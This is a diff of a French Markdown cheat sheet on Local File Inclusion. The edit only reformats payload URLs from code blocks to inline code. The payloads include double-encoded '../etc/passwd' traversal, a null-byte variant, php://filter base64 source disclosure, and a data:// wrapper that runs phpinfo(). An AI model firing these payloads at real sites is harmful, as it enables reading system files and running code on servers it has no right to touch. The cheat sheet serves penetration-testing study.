@@ -98,26 +98,23 @@ Les fichiers intéressants :
 
 ```https://fhbapt.github.io/?page=etc/password%00``` Null Byte : %00
 
-**Double Encoding**
+**Double Encoding **
 
-```
-https://fhbapt.github.io/?page=%252e%252e%252fetc%252fpasswd
-https://fhbapt.github.io/?page=%252e%252e%252fetc%252fpasswd%00
-```
+`https://fhbapt.github.io/?page=%252e%252e%252fetc%252fpasswd`
 
-**Wrapper php://filter**
+`https://fhbapt.github.io/?page=%252e%252e%252fetc%252fpasswd%00`
 
-```
-https://fhbapt.github.io/?page=php://filter/convert.base64-encode/resource=index.php
-http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
-```
+**Wrapper php://filter **
 
-**Wrapper data://**
+`https://fhbapt.github.io/?page=php://filter/convert.base64-encode/resource=index.php`
 
-```
-https://fhbapt.github.io/?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
-La payload est <?php phpinfo(); ?>
-```
+`http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php`
+
+**Wrapper data:// **
+
+`https://fhbapt.github.io/?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==`
+
+`La payload est <?php phpinfo(); ?>`
 
 **Wrapper expect:// **
 
